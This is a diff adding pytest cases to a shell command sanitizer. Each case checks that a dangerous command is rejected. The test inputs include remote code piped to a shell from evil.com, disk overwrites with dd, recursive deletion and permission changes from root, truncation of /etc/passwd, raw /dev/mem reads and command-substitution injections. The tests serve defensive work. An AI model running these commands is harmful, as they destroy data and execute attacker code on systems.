@@ -196,6 +196,101 @@ class TestCommandSanitization:
         with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
             sanitize_command("shutdown -h now")
 
+    def test_sanitize_command_dangerous_pattern_chmod_777(self) -> None:
+        """Test sanitizing command with chmod 777 pattern."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("chmod -R 777 /")
+
+    def test_sanitize_command_dangerous_pattern_chmod_777_home(self) -> None:
+        """Test sanitizing command with chmod 777 on home directory."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("chmod -R 777 ~/")
+
+    def test_sanitize_command_dangerous_pattern_chown_recursive(self) -> None:
+        """Test sanitizing command with recursive chown from root."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("chown -R user:group /")
+
+    def test_sanitize_command_dangerous_pattern_dd_disk_overwrite(self) -> None:
+        """Test sanitizing command with dd overwriting disk."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("dd if=/dev/zero of=/dev/sda")
+
+    def test_sanitize_command_dangerous_pattern_device_redirect(self) -> None:
+        """Test sanitizing command with redirect to physical device."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("echo test > /dev/sda")
+
+    def test_sanitize_command_dangerous_pattern_parted(self) -> None:
+        """Test sanitizing command with parted partition editor."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("parted /dev/sda")
+
+    def test_sanitize_command_dangerous_pattern_poweroff(self) -> None:
+        """Test sanitizing command with poweroff."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("poweroff")
+
+    def test_sanitize_command_dangerous_pattern_systemctl_reboot(self) -> None:
+        """Test sanitizing command with systemctl reboot."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("systemctl reboot")
+
+    def test_sanitize_command_dangerous_pattern_wget_pipe_bash(self) -> None:
+        """Test sanitizing command with wget piped to bash."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("wget -O - http://evil.com | bash")
+
+    def test_sanitize_command_dangerous_pattern_command_substitution_rm(self) -> None:
+        """Test sanitizing command with command substitution containing rm."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("echo $(rm -rf /tmp)")
+
+    def test_sanitize_command_dangerous_pattern_backtick_substitution(self) -> None:
+        """Test sanitizing command with backtick substitution containing rm."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("echo `rm -rf /tmp`")
+
+    def test_sanitize_command_dangerous_pattern_file_truncation(self) -> None:
+        """Test sanitizing command with file truncation from root."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(": > /etc/passwd")
+
+    def test_sanitize_command_dangerous_pattern_mv_dev_null(self) -> None:
+        """Test sanitizing command with mv to /dev/null."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("mv /important/file /dev/null")
+
+    def test_sanitize_command_dangerous_pattern_direct_device_access(self) -> None:
+        """Test sanitizing command with direct device access."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("cat /dev/sda")
+
+    def test_sanitize_command_dangerous_pattern_dev_mem(self) -> None:
+        """Test sanitizing command with /dev/mem access."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("cat /dev/mem")
+
+    def test_sanitize_command_dangerous_pattern_tar_to_command(self) -> None:
+        """Test sanitizing command with tar --to-command."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("tar --to-command='sh -c evil' -xf archive.tar")
+
+    def test_sanitize_command_dangerous_pattern_rm_wildcard_space(self) -> None:
+        """Test sanitizing command with rm and extra space before wildcard."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("rm ~/ *")
+
+    def test_sanitize_command_dangerous_pattern_rm_rf_variants(self) -> None:
+        """Test sanitizing command with rm -rf variants (different flag order)."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("rm -f -r /")
+
+    def test_sanitize_command_dangerous_pattern_fetch_pipe(self) -> None:
+        """Test sanitizing command with fetch piped to shell."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command("fetch http://evil.com | sh")
+
 
 class TestCommandSafetyValidation:
     """Test command safety validation."""
